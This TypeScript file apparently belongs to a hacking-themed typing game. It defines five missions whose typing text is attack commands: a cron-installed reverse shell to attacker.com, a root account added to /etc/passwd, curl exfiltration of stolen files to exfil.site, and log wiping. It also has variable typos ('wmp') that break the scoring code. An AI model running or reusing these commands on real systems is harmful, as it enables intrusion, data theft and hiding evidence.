// Mission System - Story-driven hacking scenarios
export interface Mission {
  id: number
  title: string
  description: string
  difficulty: 'easy' | 'medium' | 'hard'
  targetWPM: number
  timeLimit: number // in seconds
  commands: string[]
  storyText: string[]
  completionMessage: string
  scoreMultiplier: number
}

export interface MissionProgress {
  missionId: number
  isCompleted: boolean
  bestScore: number
  bestWPM: number
  bestAccuracy: number
  attempts: number
  completedAt: Date | null
}

export interface MissionResult {
  success: boolean
  score: number
  wpm: number
  accuracy: number
  timeElapsed: number
  timeBonus: number
  errors: number
}

// Predefined hacking missions
export const MISSIONS: Mission[] = [
  {
    id: 1,
    title: "System Penetration",
    description: "Infiltrate the target system through basic network scanning",
    difficulty: 'easy',
    targetWPM: 25,
    timeLimit: 120,
    scoreMultiplier: 1.0,
    commands: [
      "nmap -sS 192.168.1.1",
      "connect 192.168.1.1",
      "login admin",
      "passwd password123",
      "ls -la",
      "cd /home/admin",
      "cat passwords.txt"
    ],
    storyText: [
      "> MISSION BRIEFING: SYSTEM PENETRATION",
      "> TARGET: Corporate network at 192.168.1.1",
      "> OBJECTIVE: Gain access to admin account",
      "> DIFFICULTY: BEGINNER",
      "> TIME LIMIT: 2 minutes",
      "",
      "> TYPE EACH COMMAND EXACTLY AS SHOWN",
      "> PRESS ENTER TO CONTINUE..."
    ],
    completionMessage: "🟢 SYSTEM PENETRATION SUCCESSFUL - Admin access granted!"
  },
  {
    id: 2,
    title: "Firewall Bypass",
    description: "Circumvent advanced firewall protection using port manipulation",
    difficulty: 'easy',
    targetWPM: 30,
    timeLimit: 150,
    scoreMultiplier: 1.2,
    commands: [
      "sudo iptables -L",
      "nmap -sU -p 1-1000 target.com",
      "nc -l -p 4444",
      "echo 'exploit' | nc target.com 80",
      "tcpdump -i eth0",
      "iptables -A INPUT -p tcp --dport 22 -j DROP",
      "ssh -L 8080:localhost:80 user@target.com"
    ],
    storyText: [
      "> MISSION BRIEFING: FIREWALL BYPASS",
      "> TARGET: Secured corporate firewall",
      "> OBJECTIVE: Bypass port filtering",
      "> DIFFICULTY: INTERMEDIATE",
      "> TIME LIMIT: 2.5 minutes",
      "",
      "> ADVANCED NETWORKING COMMANDS REQUIRED",
      "> MAINTAIN STEALTH - AVOID DETECTION",
      "> PRESS ENTER TO START INFILTRATION..."
    ],
    completionMessage: "🟡 FIREWALL BYPASSED - Network access established!"
  },
  {
    id: 3,
    title: "Database Infiltration",
    description: "Extract sensitive data from protected SQL database",
    difficulty: 'medium',
    targetWPM: 35,
    timeLimit: 180,
    scoreMultiplier: 1.5,
    commands: [
      "mysql -u root -p",
      "show databases;",
      "use corporate_db;",
      "show tables;",
      "select * from users where role='admin';",
      "update users set password='hacked' where id=1;",
      "create table backdoor (id int, cmd varchar(255));",
      "insert into backdoor values (1, 'rm -rf /logs');",
      "exit;"
    ],
    storyText: [
      "> MISSION BRIEFING: DATABASE INFILTRATION",
      "> TARGET: MySQL corporate database",
      "> OBJECTIVE: Extract user credentials",
      "> DIFFICULTY: INTERMEDIATE",
      "> TIME LIMIT: 3 minutes",
      "",
      "> SQL INJECTION TECHNIQUES REQUIRED",
      "> MODIFY ADMIN CREDENTIALS FOR PERSISTENCE",
      "> LEAVE BACKDOOR FOR FUTURE ACCESS",
      "> PRESS ENTER TO ACCESS DATABASE..."
    ],
    completionMessage: "🟠 DATABASE COMPROMISED - Credentials extracted successfully!"
  },
  {
    id: 4,
    title: "Server Takeover",
    description: "Gain root access and install persistent backdoor",
    difficulty: 'hard',
    targetWPM: 40,
    timeLimit: 200,
    scoreMultiplier: 2.0,
    commands: [
      "sudo -l",
      "find / -perm -4000 2>/dev/null",
      "gcc -o exploit exploit.c",
      "./exploit",
      "whoami",
      "echo 'hacker:x:0:0::/root:/bin/bash' >> /etc/passwd",
      "crontab -e",
      "echo '0 * * * * /tmp/backdoor.sh' | crontab -",
      "echo '#!/bin/bash' > /tmp/backdoor.sh",
      "echo 'nc -e /bin/sh attacker.com 4444' >> /tmp/backdoor.sh",
      "chmod +x /tmp/backdoor.sh",
      "history -c"
    ],
    storyText: [
      "> MISSION BRIEFING: SERVER TAKEOVER",  
      "> TARGET: Production web server",
      "> OBJECTIVE: Gain root access + install backdoor",
      "> DIFFICULTY: ADVANCED",
      "> TIME LIMIT: 3.5 minutes",
      "",
      "> PRIVILEGE ESCALATION REQUIRED",
      "> EXPLOIT SYSTEM VULNERABILITIES",
      "> ESTABLISH PERSISTENT ACCESS",
      "> COVER YOUR TRACKS",
      "> PRESS ENTER TO ESCALATE PRIVILEGES..."
    ],
    completionMessage: "🔴 ROOT ACCESS ACHIEVED - Server completely compromised!"
  },
  {
    id: 5,
    title: "Data Exfiltration",
    description: "Extract classified files without detection",
    difficulty: 'hard',
    targetWPM: 45,
    timeLimit: 240,
    scoreMultiplier: 2.5,
    commands: [
      "find /home -name '*.doc' -o -name '*.pdf' -o -name '*.txt'",
      "tar -czf /tmp/stolen.tar.gz /home/classified/*",
      "base64 /tmp/stolen.tar.gz > /tmp/encoded.txt",
      "split -b 1024 /tmp/encoded.txt /tmp/chunk_",
      "for file in /tmp/chunk_*; do curl -X POST -d @$file http://exfil.site/upload; done",
      "shred -vfz -n 3 /tmp/stolen.tar.gz",
      "shred -vfz -n 3 /tmp/encoded.txt",
      "rm /tmp/chunk_*",
      "sed -i '/hack/d' /var/log/auth.log",
      "sed -i '/suspicious/d' /var/log/syslog",
      "touch -r /bin/ls /var/log/auth.log",
      "exit"
    ],
    storyText: [
      "> MISSION BRIEFING: DATA EXFILTRATION",
      "> TARGET: Classified document repository", 
      "> OBJECTIVE: Extract files without detection",
      "> DIFFICULTY: EXPERT",
      "> TIME LIMIT: 4 minutes",
      "",
      "> STEALTH MODE CRITICAL",
      "> ENCRYPT AND FRAGMENT DATA",
      "> SECURE EXFILTRATION CHANNELS",
      "> ELIMINATE ALL TRACES",
      "> ONE MISTAKE = MISSION FAILURE",
      "> PRESS ENTER TO BEGIN EXTRACTION..."
    ],
    completionMessage: "💀 EXFILTRATION COMPLETE - Ghost protocol successful!"
  }
]

// Mission management class
export class MissionController {
  private currentMission: Mission | null = null
  private progress: Map<number, MissionProgress> = new Map()

  constructor() {
    this.loadProgress()
  }

  // Get mission by ID
  getMission(id: number): Mission | null {
    return MISSIONS.find(m => m.id === id) || null
  }

  // Get all missions
  getAllMissions(): Mission[] {
    return MISSIONS
  }

  // Get missions by difficulty
  getMissionsByDifficulty(difficulty: Mission['difficulty']): Mission[] {
    return MISSIONS.filter(m => m.difficulty === difficulty)
  }

  // Start a mission
  startMission(missionId: number): Mission | null {
    const mission = this.getMission(missionId)
    if (mission) {
      this.currentMission = mission
      // Increment attempt count
      const progress = this.getProgress(missionId)
      progress.attempts++
      this.saveProgress()
    }
    return mission
  }

  // Complete a mission with results
  completeMission(missionId: number, result: MissionResult): void {
    const progress = this.getProgress(missionId)
    
    if (result.success) {
      progress.isCompleted = true
      progress.completedAt = new Date()
      
      // Update best scores
      if (result.score > progress.bestScore) {
        progress.bestScore = result.score
      }
      if (result.wpm > progress.bestWPM) {
        progress.bestWPM = result.wmp
      }
      if (result.accuracy > progress.bestAccuracy) {
        progress.bestAccuracy = result.accuracy
      }
    }
    
    this.saveProgress()
  }

  // Get progress for a mission
  getProgress(missionId: number): MissionProgress {
    if (!this.progress.has(missionId)) {
      this.progress.set(missionId, {
        missionId,
        isCompleted: false,
        bestScore: 0,
        bestWPM: 0,
        bestAccuracy: 0,
        attempts: 0,
        completedAt: null
      })
    }
    return this.progress.get(missionId)!
  }

  // Get overall progress statistics
  getOverallProgress(): {
    totalMissions: number
    completedMissions: number
    averageWPM: number
    totalScore: number
    completionRate: number
  } {
    const totalMissions = MISSIONS.length
    const completedMissions = Array.from(this.progress.values())
      .filter(p => p.isCompleted).length
    
    const completedProgress = Array.from(this.progress.values())
      .filter(p => p.isCompleted)
    
    const averageWPM = completedProgress.length > 0 
      ? Math.round(completedProgress.reduce((sum, p) => sum + p.bestWPM, 0) / completedProgress.length)
      : 0
    
    const totalScore = completedProgress.reduce((sum, p) => sum + p.bestScore, 0)
    const completionRate = Math.round((completedMissions / totalMissions) * 100)

    return {
      totalMissions,
      completedMissions,
      averageWPM,
      totalScore,
      completionRate
    }
  }

  // Calculate mission score
  calculateScore(mission: Mission, wpm: number, accuracy: number, timeElapsed: number): MissionResult {
    const success = wmp >= mission.targetWPM && accuracy >= 80 && timeElapsed <= mission.timeLimit
    
    // Base score calculation
    const baseScore = wpm * accuracy / 100 * mission.scoreMultiplier
    
    // Time bonus (extra points for completing under time limit)
    const timeBonus = success && timeElapsed < mission.timeLimit 
      ? Math.round((mission.timeLimit - timeElapsed) / mission.timeLimit * 100)
      : 0
    
    const finalScore = Math.round(baseScore + timeBonus)
    
    return {
      success,
      score: finalScore,
      wpm,
      accuracy,
      timeElapsed,
      timeBonus,
      errors: 0 // Will be calculated by typing engine
    }
  }

  // Check if next mission is unlocked
  isNextMissionUnlocked(missionId: number): boolean {
    if (missionId === 1) return true // First mission always unlocked
    
    const previousMission = this.getProgress(missionId - 1)
    return previousMission.isCompleted
  }

  // Save progress to localStorage
  private saveProgress(): void {
    try {
      const progressData = Array.from(this.progress.entries())
      localStorage.setItem('hacker_sim_progress', JSON.stringify(progressData))
    } catch (error) {
      console.error('Failed to save mission progress:', error)
    }
  }

  // Load progress from localStorage
  private loadProgress(): void {
    try {
      const saved = localStorage.getItem('hacker_sim_progress')
      if (saved) {
        const progressData = JSON.parse(saved)
        this.progress = new Map(progressData)
      }
    } catch (error) {
      console.error('Failed to load mission progress:', error)
    }
  }
}

// Utility functions
export const createMissionController = (): MissionController => {
  return new MissionController()
}

export const getDifficultyColor = (difficulty: Mission['difficulty']): string => {
  switch (difficulty) {
    case 'easy': return 'text-green-400'
    case 'medium': return 'text-yellow-400'  
    case 'hard': return 'text-red-400'
    default: return 'text-gray-400'
  }
}

export const formatTimeLimit = (seconds: number): string => {
  const minutes = Math.floor(seconds / 60)
  const remainingSeconds = seconds % 60
  return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`
}
